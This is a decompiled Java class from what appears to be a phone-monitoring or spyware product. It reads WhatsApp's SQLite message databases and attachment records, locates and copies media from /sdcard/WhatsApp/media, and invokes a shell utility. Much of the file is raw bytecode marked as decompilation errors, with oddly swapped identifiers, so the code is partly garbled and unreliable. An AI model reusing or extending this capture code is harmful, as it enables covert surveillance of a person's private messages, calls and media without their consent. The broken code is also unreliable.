package com.vvt.capture.wa.full;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.ConditionVariable;
import android.os.SystemClock;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.e;
import com.vvt.im.events.info.f;
import java.io.File;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;
import javax.net.ssl.HttpsURLConnection;

public class a
{
  public static final boolean a;
  public static final boolean b;
  public static final boolean c;
  private static boolean d;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      return;
    }
  }
  
  /* Error */
  public static long a()
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_0
    //   3: aconst_null
    //   4: astore_2
    //   5: ldc 25
    //   7: astore_3
    //   8: ldc 27
    //   10: astore 4
    //   12: aload_3
    //   13: aload 4
    //   15: invokestatic 32	com/vvt/capture/wa/removeFromPath/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   18: astore 4
    //   20: aload 4
    //   22: invokestatic 35	com/vvt/capture/wa/full/a:removeFromPath	(Landroid/database/sqlite/SQLiteDatabase;)J
    //   25: lstore 5
    //   27: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   30: istore 7
    //   32: iload 7
    //   34: ifeq +3 -> 37
    //   37: aload 4
    //   39: ifnull +8 -> 47
    //   42: aload 4
    //   44: invokevirtual 41	android/database/sqlite/SQLiteDatabase:close	()V
    //   47: lload 5
    //   49: lreturn
    //   50: astore_3
    //   51: aconst_null
    //   52: astore 4
    //   54: lload_0
    //   55: lstore 5
    //   57: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   60: istore 7
    //   62: iload 7
    //   64: ifeq +3 -> 67
    //   67: aload 4
    //   69: ifnull -22 -> 47
    //   72: goto -30 -> 42
    //   75: astore_3
    //   76: aconst_null
    //   77: astore 4
    //   79: aload_3
    //   80: astore_2
    //   81: aload 4
    //   83: ifnull +8 -> 91
    //   86: aload 4
    //   88: invokevirtual 41	android/database/sqlite/SQLiteDatabase:close	()V
    //   91: aload_2
    //   92: athrow
    //   93: astore_2
    //   94: goto -13 -> 81
    //   97: astore_2
    //   98: lload_0
    //   99: lstore 5
    //   101: goto -44 -> 57
    //   104: pop
    //   105: goto -48 -> 57
    // Local variable table:
    //   start	length	slot	name	signature
    //   2	97	0	l1	long
    //   4	88	2	localObject1	Object
    //   93	1	2	localObject2	Object
    //   97	1	2	localException1	Exception
    //   7	6	3	str	String
    //   50	1	3	localException2	Exception
    //   75	5	3	localObject3	Object
    //   10	77	4	localObject4	Object
    //   25	75	5	l2	long
    //   30	33	7	bool	boolean
    //   104	1	10	localException3	Exception
    // Exception table:
    //   from	to	target	type
    //   13	18	50	java/lang/Exception
    //   13	18	75	finally
    //   20	25	93	finally
    //   27	30	93	finally
    //   57	60	93	finally
    //   20	25	97	java/lang/Exception
    //   27	30	104	java/lang/Exception
  }
  
  public static long a(String paramString)
  {
    localSQLiteDatabase = null;
    long l = -1;
    try
    {
      localSQLiteDatabase = com.vvt.capture.wa.b.b.a(paramString);
      l = b(localSQLiteDatabase);
      bool = a;
      if (bool) {}
      if (localSQLiteDatabase == null) {
        break label33;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        label33:
        boolean bool = c;
        if ((bool) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label63;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    return l;
  }
  
  /* Error */
  private static com.vvt.capture.wa.a.d a(SQLiteDatabase paramSQLiteDatabase, String paramString, boolean paramBoolean)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: aconst_null
    //   3: astore 4
    //   5: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   8: istore 5
    //   10: iload 5
    //   12: ifeq +3 -> 15
    //   15: new 48	com/vvt/capture/wa/a/d
    //   18: astore 6
    //   20: aload 6
    //   22: invokespecial 51	com/vvt/capture/wa/a/d:<init>	()V
    //   25: iload_3
    //   26: anewarray 4	java/lang/Object
    //   29: astore 7
    //   31: aload 7
    //   33: iconst_0
    //   34: ldc 55
    //   36: aastore
    //   37: ldc 53
    //   39: aload 7
    //   41: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   44: astore 8
    //   46: iload_3
    //   47: anewarray 57	java/lang/String
    //   50: astore 9
    //   52: new 63	java/lang/StringBuilder
    //   55: astore 10
    //   57: aload 10
    //   59: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   62: aload 10
    //   64: aload_1
    //   65: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   68: ldc 70
    //   70: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   73: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   76: astore 10
    //   78: aload 9
    //   80: iconst_0
    //   81: aload 10
    //   83: aastore
    //   84: ldc 76
    //   86: astore 7
    //   88: iload_3
    //   89: anewarray 4	java/lang/Object
    //   92: astore 11
    //   94: iload_2
    //   95: ifeq +237 -> 332
    //   98: ldc 78
    //   100: astore 10
    //   102: aload 11
    //   104: iconst_0
    //   105: aload 10
    //   107: aastore
    //   108: aload 7
    //   110: aload 11
    //   112: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   115: astore 12
    //   117: ldc 80
    //   119: astore 7
    //   121: aconst_null
    //   122: astore 11
    //   124: iconst_0
    //   125: istore_3
    //   126: aload_0
    //   127: astore 10
    //   129: aload_0
    //   130: aload 7
    //   132: aconst_null
    //   133: aload 8
    //   135: aload 9
    //   137: aconst_null
    //   138: aconst_null
    //   139: aload 12
    //   141: invokevirtual 84	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   144: astore 10
    //   146: aload 10
    //   148: ifnull +149 -> 297
    //   151: aload 10
    //   153: invokeinterface 90 1 0
    //   158: istore 13
    //   160: iload 13
    //   162: ifeq +135 -> 297
    //   165: ldc 92
    //   167: astore 7
    //   169: aload 10
    //   171: aload 7
    //   173: invokeinterface 96 2 0
    //   178: istore 13
    //   180: aload 10
    //   182: iload 13
    //   184: invokeinterface 100 2 0
    //   189: astore 7
    //   191: aload 6
    //   193: aload 7
    //   195: invokevirtual 103	com/vvt/capture/wa/a/d:a	(Ljava/lang/String;)V
    //   198: ldc 105
    //   200: astore 7
    //   202: aload 10
    //   204: aload 7
    //   206: invokeinterface 96 2 0
    //   211: istore 13
    //   213: aload 10
    //   215: iload 13
    //   217: invokeinterface 100 2 0
    //   222: astore 7
    //   224: aload 6
    //   226: aload 7
    //   228: invokevirtual 107	com/vvt/capture/wa/a/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   231: ldc 109
    //   233: astore 7
    //   235: aload 10
    //   237: aload 7
    //   239: invokeinterface 96 2 0
    //   244: istore 13
    //   246: aload 10
    //   248: iload 13
    //   250: invokeinterface 100 2 0
    //   255: astore 7
    //   257: aload 6
    //   259: aload 7
    //   261: invokevirtual 111	com/vvt/capture/wa/a/d:removeFromPath	(Ljava/lang/String;)V
    //   264: ldc 113
    //   266: astore 7
    //   268: aload 10
    //   270: aload 7
    //   272: invokeinterface 96 2 0
    //   277: istore 13
    //   279: aload 10
    //   281: iload 13
    //   283: invokeinterface 100 2 0
    //   288: astore 7
    //   290: aload 6
    //   292: aload 7
    //   294: invokevirtual 115	com/vvt/capture/wa/a/d:d	(Ljava/lang/String;)V
    //   297: aload 10
    //   299: ifnull +10 -> 309
    //   302: aload 10
    //   304: invokeinterface 116 1 0
    //   309: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   312: istore 5
    //   314: iload 5
    //   316: ifeq +3 -> 319
    //   319: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   322: istore 5
    //   324: iload 5
    //   326: ifeq +3 -> 329
    //   329: aload 6
    //   331: areturn
    //   332: ldc 118
    //   334: astore 10
    //   336: goto -234 -> 102
    //   339: astore 10
    //   341: iconst_0
    //   342: istore 5
    //   344: aconst_null
    //   345: astore 10
    //   347: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   350: istore 13
    //   352: iload 13
    //   354: ifeq +3 -> 357
    //   357: aload 10
    //   359: ifnull -50 -> 309
    //   362: goto -60 -> 302
    //   365: astore 10
    //   367: aload 4
    //   369: ifnull +10 -> 379
    //   372: aload 4
    //   374: invokeinterface 116 1 0
    //   379: aload 10
    //   381: athrow
    //   382: astore 7
    //   384: aload 10
    //   386: astore 4
    //   388: aload 7
    //   390: astore 10
    //   392: goto -25 -> 367
    //   395: astore 7
    //   397: goto -50 -> 347
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	400	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	400	1	paramString	String
    //   0	400	2	paramBoolean	boolean
    //   1	125	3	i	int
    //   3	384	4	localObject1	Object
    //   8	335	5	bool1	boolean
    //   18	312	6	locald	com.vvt.capture.wa.a.d
    //   29	264	7	localObject2	Object
    //   382	7	7	localObject3	Object
    //   395	1	7	localException1	Exception
    //   44	90	8	str1	String
    //   50	86	9	arrayOfString	String[]
    //   55	280	10	localObject4	Object
    //   339	1	10	localException2	Exception
    //   345	13	10	localObject5	Object
    //   365	20	10	localObject6	Object
    //   390	1	10	localObject7	Object
    //   92	31	11	arrayOfObject	Object[]
    //   115	25	12	str2	String
    //   158	3	13	bool2	boolean
    //   178	104	13	j	int
    //   350	3	13	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   139	144	339	java/lang/Exception
    //   139	144	365	finally
    //   151	158	382	finally
    //   171	178	382	finally
    //   182	189	382	finally
    //   193	198	382	finally
    //   204	211	382	finally
    //   215	222	382	finally
    //   226	231	382	finally
    //   237	244	382	finally
    //   248	255	382	finally
    //   259	264	382	finally
    //   270	277	382	finally
    //   281	288	382	finally
    //   292	297	382	finally
    //   347	350	382	finally
    //   151	158	395	java/lang/Exception
    //   171	178	395	java/lang/Exception
    //   182	189	395	java/lang/Exception
    //   193	198	395	java/lang/Exception
    //   204	211	395	java/lang/Exception
    //   215	222	395	java/lang/Exception
    //   226	231	395	java/lang/Exception
    //   237	244	395	java/lang/Exception
    //   248	255	395	java/lang/Exception
    //   259	264	395	java/lang/Exception
    //   270	277	395	java/lang/Exception
    //   281	288	395	java/lang/Exception
    //   292	297	395	java/lang/Exception
  }
  
  private static c a(String paramString1, long paramLong1, long paramLong2, String paramString2, String paramString3)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    for (;;)
    {
      try
      {
        localHashtable = new java/util/Hashtable;
        localHashtable.<init>();
        localObject3 = new java/io/File;
        localObject4 = "/sdcard/WhatsApp/media/WhatsApp Video";
        localObject4 = com.vvt.io.d.h((String)localObject4);
        ((File)localObject3).<init>((String)localObject4);
        localObject4 = "VID-%s-WA";
        localHashtable.put(localObject3, localObject4);
        localEnumeration = localHashtable.keys();
        localObject5 = null;
      }
      catch (Exception localException2)
      {
        Hashtable localHashtable;
        Object localObject3;
        Object localObject4;
        Enumeration localEnumeration;
        Object localObject5;
        Object localObject6;
        boolean bool2;
        boolean bool3 = c;
        if (!bool3) {
          continue;
        }
        continue;
        Object localObject2;
        continue;
      }
      try
      {
        bool1 = localEnumeration.hasMoreElements();
        if (!bool1) {
          continue;
        }
        localObject1 = localEnumeration.nextElement();
        localObject1 = (File)localObject1;
        localObject6 = localHashtable.get(localObject1);
        localObject6 = (String)localObject6;
        localObject3 = paramString1;
        localObject1 = com.vvt.capture.wa.b.a.a((File)localObject1, paramString1, paramLong1, paramLong2, (String)localObject6, paramString2, paramString3);
        localObject3 = ((c)localObject1).b;
        bool2 = com.vvt.ag.b.a((String)localObject3);
        if (bool2) {
          continue;
        }
        localObject4 = new java/io/File;
        ((File)localObject4).<init>((String)localObject3);
        bool3 = ((File)localObject4).exists();
        if (!bool3) {
          continue;
        }
      }
      catch (Exception localException1)
      {
        localObject2 = localObject5;
        continue;
        localObject2 = localObject5;
        continue;
        localObject5 = localObject2;
      }
      return (c)localObject1;
      localObject5 = localObject1;
    }
  }
  
  /* Error */
  private static com.vvt.im.events.info.a a(SQLiteDatabase paramSQLiteDatabase, String paramString, int paramInt1, int paramInt2, ICallLogData.Direction paramDirection, com.vvt.base.b paramb, boolean paramBoolean)
  {
    // Byte code:
    //   0: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   3: istore 7
    //   5: iload 7
    //   7: ifeq +3 -> 10
    //   10: new 176	com/vvt/im/events/info/a
    //   13: astore 8
    //   15: aload 8
    //   17: invokespecial 177	com/vvt/im/events/info/a:<init>	()V
    //   20: iconst_1
    //   21: anewarray 4	java/lang/Object
    //   24: astore 9
    //   26: aload 9
    //   28: iconst_0
    //   29: ldc 118
    //   31: aastore
    //   32: ldc 53
    //   34: aload 9
    //   36: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   39: astore 10
    //   41: iconst_1
    //   42: anewarray 57	java/lang/String
    //   45: astore 11
    //   47: iconst_0
    //   48: istore 7
    //   50: new 63	java/lang/StringBuilder
    //   53: astore 9
    //   55: aload 9
    //   57: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   60: aload 9
    //   62: iload_2
    //   63: invokevirtual 180	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   66: ldc 70
    //   68: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   71: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   74: astore 9
    //   76: aload 11
    //   78: iconst_0
    //   79: aload 9
    //   81: aastore
    //   82: iconst_1
    //   83: istore 12
    //   85: iload 12
    //   87: anewarray 4	java/lang/Object
    //   90: astore 9
    //   92: aload 9
    //   94: iconst_0
    //   95: ldc 118
    //   97: aastore
    //   98: ldc 76
    //   100: aload 9
    //   102: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   105: astore 13
    //   107: ldc -74
    //   109: astore 9
    //   111: iconst_0
    //   112: istore 14
    //   114: aconst_null
    //   115: astore 15
    //   117: aconst_null
    //   118: astore 16
    //   120: iconst_0
    //   121: istore 17
    //   123: aconst_null
    //   124: astore 18
    //   126: aload_0
    //   127: astore 19
    //   129: aload_0
    //   130: aload 9
    //   132: aconst_null
    //   133: aload 10
    //   135: aload 11
    //   137: aconst_null
    //   138: aconst_null
    //   139: aload 13
    //   141: invokevirtual 84	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   144: astore 20
    //   146: aload 20
    //   148: ifnull +523 -> 671
    //   151: aload 20
    //   153: invokeinterface 185 1 0
    //   158: istore 7
    //   160: iload 7
    //   162: ifeq +509 -> 671
    //   165: ldc -69
    //   167: astore 19
    //   169: aload 20
    //   171: astore 21
    //   173: aload 20
    //   175: aload 19
    //   177: invokeinterface 96 2 0
    //   182: istore 7
    //   184: aload 20
    //   186: iload 7
    //   188: invokeinterface 100 2 0
    //   193: astore 22
    //   195: ldc -67
    //   197: astore 19
    //   199: aload 20
    //   201: aload 19
    //   203: invokeinterface 96 2 0
    //   208: istore 7
    //   210: aload 20
    //   212: iload 7
    //   214: invokeinterface 100 2 0
    //   219: astore 23
    //   221: ldc -65
    //   223: astore 19
    //   225: aload 20
    //   227: aload 19
    //   229: invokeinterface 96 2 0
    //   234: istore 7
    //   236: aload 20
    //   238: iload 7
    //   240: invokeinterface 195 2 0
    //   245: lstore 24
    //   247: ldc -59
    //   249: astore 19
    //   251: aload 20
    //   253: aload 19
    //   255: invokeinterface 96 2 0
    //   260: istore 7
    //   262: aload 20
    //   264: iload 7
    //   266: invokeinterface 195 2 0
    //   271: lstore 26
    //   273: ldc -57
    //   275: astore 19
    //   277: aload 20
    //   279: aload 19
    //   281: invokeinterface 96 2 0
    //   286: istore 7
    //   288: aload 20
    //   290: iload 7
    //   292: invokeinterface 100 2 0
    //   297: astore 28
    //   299: iconst_0
    //   300: istore 7
    //   302: aconst_null
    //   303: astore 19
    //   305: iconst_0
    //   306: istore 12
    //   308: aconst_null
    //   309: astore 9
    //   311: iconst_0
    //   312: newarray <illegal type>
    //   314: astore 21
    //   316: aload 21
    //   318: astore 29
    //   320: getstatic 205	com/vvt/im/events/ImType:WHATSAPP	Lcom/vvt/im/events/ImType;
    //   323: astore 9
    //   325: getstatic 211	com/vvt/im/events/ImMediaFileType:ATTACHMENT	Lcom/vvt/im/events/ImMediaFileType;
    //   328: astore 15
    //   330: aload_1
    //   331: astore 21
    //   333: aload_1
    //   334: aload 9
    //   336: aload 15
    //   338: invokestatic 216	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   341: astore 30
    //   343: getstatic 211	com/vvt/im/events/ImMediaFileType:ATTACHMENT	Lcom/vvt/im/events/ImMediaFileType;
    //   346: astore 9
    //   348: aload 9
    //   350: invokestatic 219	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   353: astore 31
    //   355: new 63	java/lang/StringBuilder
    //   358: astore 9
    //   360: aload 9
    //   362: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   365: aload 9
    //   367: aload 30
    //   369: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   372: astore 9
    //   374: getstatic 222	java/io/File:separator	Ljava/lang/String;
    //   377: astore 15
    //   379: aload 9
    //   381: aload 15
    //   383: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   386: astore 9
    //   388: aload 9
    //   390: aload 31
    //   392: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   395: astore 9
    //   397: aload 9
    //   399: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   402: astore 16
    //   404: getstatic 228	com/vvt/im/events/info/ICallLogData$Direction:IN	Lcom/vvt/im/events/info/ICallLogData$Direction;
    //   407: astore 9
    //   409: aload 4
    //   411: astore 21
    //   413: aload 4
    //   415: aload 9
    //   417: if_acmpne +636 -> 1053
    //   420: lconst_0
    //   421: lstore 32
    //   423: lload 26
    //   425: lload 32
    //   427: lcmp
    //   428: istore 12
    //   430: iload 12
    //   432: ifgt +1754 -> 2186
    //   435: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   438: istore 12
    //   440: iload 12
    //   442: ifeq +3 -> 445
    //   445: aload 22
    //   447: invokestatic 233	com/vvt/http/e:a	(Ljava/lang/String;)J
    //   450: lstore 32
    //   452: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   455: istore 17
    //   457: iload 17
    //   459: ifeq +3 -> 462
    //   462: iconst_1
    //   463: istore 17
    //   465: lconst_0
    //   466: lstore 26
    //   468: lload 32
    //   470: lload 26
    //   472: lcmp
    //   473: istore 34
    //   475: iload 34
    //   477: ifle +13 -> 490
    //   480: iload_3
    //   481: aload 5
    //   483: lload 32
    //   485: invokestatic 236	com/vvt/capture/wa/full/a:a	(ILcom/vvt/base/removeFromPath;J)Z
    //   488: istore 17
    //   490: aload 22
    //   492: ifnull +49 -> 541
    //   495: iload 17
    //   497: ifeq +44 -> 541
    //   500: iconst_1
    //   501: istore 17
    //   503: iload_3
    //   504: iload 17
    //   506: if_icmpne +190 -> 696
    //   509: ldc -18
    //   511: astore 18
    //   513: aload 22
    //   515: aload 18
    //   517: invokevirtual 241	java/lang/String:endsWith	(Ljava/lang/String;)Z
    //   520: istore 17
    //   522: iload 17
    //   524: ifeq +172 -> 696
    //   527: aload_0
    //   528: astore 21
    //   530: aload_0
    //   531: iload_2
    //   532: aload 30
    //   534: aload 31
    //   536: invokestatic 244	com/vvt/capture/wa/full/a:a	(Landroid/database/sqlite/SQLiteDatabase;ILjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   539: astore 16
    //   541: aload 19
    //   543: astore 9
    //   545: aload 23
    //   547: astore 15
    //   549: aload 29
    //   551: astore 19
    //   553: aload 16
    //   555: ifnull +1550 -> 2105
    //   558: new 123	java/io/File
    //   561: astore 10
    //   563: aload 10
    //   565: aload 16
    //   567: invokespecial 133	java/io/File:<init>	(Ljava/lang/String;)V
    //   570: aload 10
    //   572: invokevirtual 248	java/io/File:length	()J
    //   575: lstore 24
    //   577: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   580: istore 17
    //   582: iload 17
    //   584: ifeq +3 -> 587
    //   587: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   590: istore 17
    //   592: iload 17
    //   594: ifeq +3 -> 597
    //   597: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   600: istore 17
    //   602: iload 17
    //   604: ifeq +3 -> 607
    //   607: iload_3
    //   608: aload 5
    //   610: lload 24
    //   612: invokestatic 236	com/vvt/capture/wa/full/a:a	(ILcom/vvt/base/removeFromPath;J)Z
    //   615: istore 35
    //   617: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   620: istore 36
    //   622: iload 36
    //   624: ifeq +3 -> 627
    //   627: iload 35
    //   629: ifeq +1409 -> 2038
    //   632: aload 8
    //   634: astore 21
    //   636: aload 8
    //   638: aload 16
    //   640: invokevirtual 249	com/vvt/im/events/info/a:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   643: aload 8
    //   645: aload 15
    //   647: invokevirtual 250	com/vvt/im/events/info/a:removeFromPath	(Ljava/lang/String;)V
    //   650: aload 8
    //   652: aload 19
    //   654: invokevirtual 253	com/vvt/im/events/info/a:removeFromPath	([B)V
    //   657: aload 8
    //   659: aload 9
    //   661: invokevirtual 254	com/vvt/im/events/info/a:a	(Ljava/lang/String;)V
    //   664: aload 8
    //   666: aload 28
    //   668: invokevirtual 256	com/vvt/im/events/info/a:e	(Ljava/lang/String;)V
    //   671: aload 20
    //   673: ifnull +10 -> 683
    //   676: aload 20
    //   678: invokeinterface 116 1 0
    //   683: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   686: istore 7
    //   688: iload 7
    //   690: ifeq +3 -> 693
    //   693: aload 8
    //   695: areturn
    //   696: bipush 9
    //   698: istore 7
    //   700: iload_3
    //   701: iload 7
    //   703: if_icmpne +129 -> 832
    //   706: ldc_w 259
    //   709: astore 19
    //   711: aload 20
    //   713: astore 21
    //   715: aload 20
    //   717: aload 19
    //   719: invokeinterface 96 2 0
    //   724: istore 7
    //   726: aload 20
    //   728: iload 7
    //   730: invokeinterface 100 2 0
    //   735: astore 19
    //   737: aload 19
    //   739: invokestatic 171	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   742: istore 12
    //   744: iload 12
    //   746: ifne -205 -> 541
    //   749: aload 19
    //   751: invokestatic 261	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   754: astore 19
    //   756: ldc_w 263
    //   759: astore 9
    //   761: aload 9
    //   763: aload 19
    //   765: invokestatic 268	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   768: astore 9
    //   770: aload 9
    //   772: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   775: astore 9
    //   777: aload 9
    //   779: aload 16
    //   781: invokestatic 271	com/vvt/io/d:a	(Ljava/lang/String;Ljava/lang/String;)V
    //   784: aload 5
    //   786: invokevirtual 276	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   789: astore 9
    //   791: aload 9
    //   793: aload 16
    //   795: invokestatic 280	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)V
    //   798: goto -257 -> 541
    //   801: astore 19
    //   803: aload 20
    //   805: astore 19
    //   807: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   810: istore 12
    //   812: iload 12
    //   814: ifeq +3 -> 817
    //   817: aload 19
    //   819: ifnull -136 -> 683
    //   822: aload 19
    //   824: invokeinterface 116 1 0
    //   829: goto -146 -> 683
    //   832: iconst_2
    //   833: istore 7
    //   835: iload_3
    //   836: iload 7
    //   838: if_icmpne +91 -> 929
    //   841: ldc -18
    //   843: astore 19
    //   845: aload 22
    //   847: aload 19
    //   849: invokevirtual 241	java/lang/String:endsWith	(Ljava/lang/String;)Z
    //   852: istore 7
    //   854: iload 7
    //   856: ifeq +73 -> 929
    //   859: ldc_w 259
    //   862: astore 19
    //   864: aload 20
    //   866: astore 21
    //   868: aload 20
    //   870: aload 19
    //   872: invokeinterface 96 2 0
    //   877: istore 7
    //   879: aload 20
    //   881: iload 7
    //   883: invokeinterface 100 2 0
    //   888: astore 19
    //   890: aload 5
    //   892: invokevirtual 276	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   895: astore 18
    //   897: aload 19
    //   899: lload 32
    //   901: lload 24
    //   903: aload 16
    //   905: aload 18
    //   907: invokestatic 284	com/vvt/capture/wa/full/a:removeFromPath	(Ljava/lang/String;JJLjava/lang/String;Ljava/lang/String;)Lcom/vvt/capture/wa/full/MyUncaughtExceptionHandler;
    //   910: astore 9
    //   912: aload 9
    //   914: getfield 286	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   917: astore 19
    //   919: aload 9
    //   921: getfield 166	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   924: astore 16
    //   926: goto -385 -> 541
    //   929: iconst_3
    //   930: istore 7
    //   932: iload_3
    //   933: iload 7
    //   935: if_icmpne +91 -> 1026
    //   938: ldc -18
    //   940: astore 19
    //   942: aload 22
    //   944: aload 19
    //   946: invokevirtual 241	java/lang/String:endsWith	(Ljava/lang/String;)Z
    //   949: istore 7
    //   951: iload 7
    //   953: ifeq +73 -> 1026
    //   956: ldc_w 259
    //   959: astore 19
    //   961: aload 20
    //   963: astore 21
    //   965: aload 20
    //   967: aload 19
    //   969: invokeinterface 96 2 0
    //   974: istore 7
    //   976: aload 20
    //   978: iload 7
    //   980: invokeinterface 100 2 0
    //   985: astore 19
    //   987: aload 5
    //   989: invokevirtual 276	com/vvt/base/removeFromPath:f	()Ljava/lang/String;
    //   992: astore 18
    //   994: aload 19
    //   996: lload 32
    //   998: lload 24
    //   1000: aload 16
    //   1002: aload 18
    //   1004: invokestatic 289	com/vvt/capture/wa/full/a:a	(Ljava/lang/String;JJLjava/lang/String;Ljava/lang/String;)Lcom/vvt/capture/wa/full/MyUncaughtExceptionHandler;
    //   1007: astore 9
    //   1009: aload 9
    //   1011: getfield 286	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:a	Ljava/lang/String;
    //   1014: astore 19
    //   1016: aload 9
    //   1018: getfield 166	com/vvt/capture/wa/full/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   1021: astore 16
    //   1023: goto -482 -> 541
    //   1026: aload 22
    //   1028: invokestatic 290	com/vvt/capture/wa/removeFromPath/a:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   1031: astore 19
    //   1033: aload 22
    //   1035: aload 16
    //   1037: invokestatic 293	com/vvt/capture/wa/full/a:a	(Ljava/lang/String;Ljava/lang/String;)Z
    //   1040: istore 12
    //   1042: iload 12
    //   1044: ifne -503 -> 541
    //   1047: aconst_null
    //   1048: astore 16
    //   1050: goto -509 -> 541
    //   1053: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   1056: istore 7
    //   1058: iload 7
    //   1060: ifeq +3 -> 1063
    //   1063: iconst_3
    //   1064: istore 7
    //   1066: iload_3
    //   1067: iload 7
    //   1069: if_icmpne +647 -> 1716
    //   1072: iload 6
    //   1074: ifeq +642 -> 1716
    //   1077: ldc_w 295
    //   1080: astore 19
    //   1082: ldc2_w 296
    //   1085: lstore 32
    //   1087: bipush 6
    //   1089: istore 17
    //   1091: iload_2
    //   1092: aload 19
    //   1094: lload 32
    //   1096: iload 17
    //   1098: invokestatic 303	com/vvt/capture/wa/full/a:a	(ILjava/lang/String;JI)Ljava/lang/String;
    //   1101: pop
    //   1102: ldc_w 259
    //   1105: astore 19
    //   1107: ldc2_w 304
    //   1110: lstore 32
    //   1112: iconst_3
    //   1113: istore 17
    //   1115: iload_2
    //   1116: aload 19
    //   1118: lload 32
    //   1120: iload 17
    //   1122: invokestatic 303	com/vvt/capture/wa/full/a:a	(ILjava/lang/String;JI)Ljava/lang/String;
    //   1125: astore 18
    //   1127: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   1130: istore 7
    //   1132: iload 7
    //   1134: ifeq +3 -> 1137
    //   1137: new 309	java/util/ArrayList
    //   1140: astore 19
    //   1142: aload 19
